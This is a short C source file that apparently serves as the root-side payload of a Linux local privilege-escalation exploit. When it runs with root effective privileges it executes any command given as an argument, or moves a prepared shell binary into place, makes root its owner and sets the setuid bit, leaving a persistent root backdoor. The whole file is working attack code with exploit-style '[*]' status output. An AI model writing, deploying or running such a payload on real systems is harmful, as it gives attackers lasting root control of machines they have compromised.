#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include "config.h"

int main (int argc, char **argv) {

	char fnshell[1024];

	if (geteuid() ==0) {

		if (setuid(0)!=0) {
			printf("setuid failed\n");
			return 0;
		}
		if (setgid(0)!=0) {
			printf("setgid failed\n");
			return 0;
		}

		if (argc > 1) {
			system(argv[1]);
			return 0;
		}		

		if (access(PATHSHELL,R_OK|X_OK)!=0) {

			snprintf(fnshell,sizeof(fnshell),"%s/shell",PATH);
	
			printf("[*] Seems we are uid = %d and gid = %d\n",getuid(),getgid());
			printf("[*] mv %s %s\n",fnshell,PATHSHELL);
			if (rename(fnshell, PATHSHELL)!=0)
				perror("rename");
			printf("[*] chown root.root %s\n",PATHSHELL);
			if (chown(PATHSHELL,0,0)!=0)
				perror("chown");
			printf("[*] chmod 4755 %s\n",PATHSHELL);
			if (chmod(PATHSHELL,04755)!=0) 
				perror("chmod");
		}

	}

	return 0;
}
